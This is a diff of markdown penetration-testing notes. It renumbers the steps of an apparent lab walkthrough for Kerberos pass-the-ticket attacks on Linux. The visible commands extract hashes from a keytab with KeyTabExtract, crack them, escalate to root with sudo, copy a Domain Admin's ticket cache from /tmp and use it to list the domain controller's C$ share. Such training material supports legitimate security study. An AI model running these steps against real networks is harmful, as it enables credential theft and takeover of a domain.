@@ -4895,7 +4895,9 @@ env | grep -i krb5
 <details>
 <summary><h5>Backup existing Kerberos Ticket before using a Keytab</h5></summary>
 
-Before importing a new ticket via keytab, make a backup of the current credential cache file to avoid losing your existing Kerberos TGT:
+Before importing a new ticket via keytab, make a backup of the current credential cache file to avoid losing your existing Kerberos TGT.
+
+**1. Create the backup**
 
 ```bash
 echo $KRB5CCNAME
@@ -4911,7 +4913,7 @@ This lets you restore the original ticket later, preserving session continuity a
 
 Ccache files are located, by default, at `/tmp`.
 
-**Read information from a keytab file:**
+**1. Read information from a keytab file:**
 
 ```bash
 ls -la /tmp
@@ -5018,7 +5020,7 @@ We can use KeyTabExtract—a Python script—to extract data from version 0x502 
 * Encryption Types
 * Hashes (e.g. NTLM, AES-256, AES-128)
 
-**Use KeyTabExtract to extract the info:**
+**1. Use KeyTabExtract to extract the info:**
 
 ```bash
 python3 ./keytabextract.py /opt/specialfiles/carlos.keytab 
@@ -5044,13 +5046,13 @@ With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AE
 
 The most straightforward hash to crack is the NTLM hash. We can use tools like Hashcat or John the Ripper to crack it. However, a quick way to decrypt passwords is with online repositories such as [crackstation](https://crackstation.net/), which contains billions of passwords.
 
-**Log in as the desired user:**
+**2. Log in as the desired user:**
 
 ```bash
 su - carlos@<DOMAIN>
 ```
 
-**Obtain more hashes:**
+**3. Obtain more hashes:**
 
 The user has a cronjob that uses a KeyTab file named, for example, `svc_workstations.kt`. We can repeat the process, crack the password, and log in as svc_workstations.
 
@@ -5067,25 +5069,25 @@ After logging in with the `svc_workstations` credentials, we can run `sudo -l` t
 
 ---
 
-**Connect to Target via SSH**
+**1. Connect to Target via SSH**
 
 ```bash
 ssh svc_workstations@<>@<IP> -p <PORT_TO_FORWARD>
 ```
 
-**Check Sudo Permissions**
+**2. Check Sudo Permissions**
 
 ```bash
 sudo -l
 ```
 
-**Elevate to Root User**
+**3. Elevate to Root User**
 
 ```bash
 sudo su
 ```
 
-**Confirm Current User**
+**4. Confirm Current User**
 
 ```bash
 whoami
@@ -5095,7 +5097,7 @@ whoami
 
 As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.
 
-**Confirm current user**
+**5. Confirm current user**
 
 ```bash
 ls -la /tmp
@@ -5117,7 +5119,7 @@ ls -la /tmp
 
 If there is an user to whom we have not yet gained access. We can confirm the groups to which he belongs using id.
 
-**Identify group membership**
+**6. Identify group membership**
 
 ```bash
 id julio@<DOMAIN>
@@ -5135,7 +5137,7 @@ Julio is a member of the **Domain Admins** group. We can attempt to impersonate 
 
 To import the ccache file into our current session, we can copy the ccache file and assign the file path to the KRB5CCNAME variable.
 
-**List Kerberos Tickets:**
+**1. List Kerberos Tickets:**
 
 ```bash
 klist
@@ -5147,19 +5149,19 @@ klist
 # klist: No credentials cache found (filename: /tmp/krb5cc_0)
 ```
 
-**Copy Kerberos Ticket Cache File:**
+**2. Copy Kerberos Ticket Cache File:**
 
 ```bash
 cp /tmp/krb5cc_647401106_I8I133 .
 ```
 
-**Set Kerberos Cache Environment Variable:**
+**3. Set Kerberos Cache Environment Variable:**
 
 ```bash
 export KRB5CCNAME=/root/krb5cc_647401106_I8I133
 ```
 
-**List Kerberos Tickets:**
+**4. List Kerberos Tickets:**
 
 ```bash
 klist
@@ -5176,7 +5178,7 @@ klist
 #         renew until 10/08/2025 13:25:01
 ```
 
-**Access SMB Share Using Kerberos Authentication:**
+**5. Access SMB Share Using Kerberos Authentication:**
 
 ```bash
 smbclient //dc01/C$ -k -c ls -no-pass
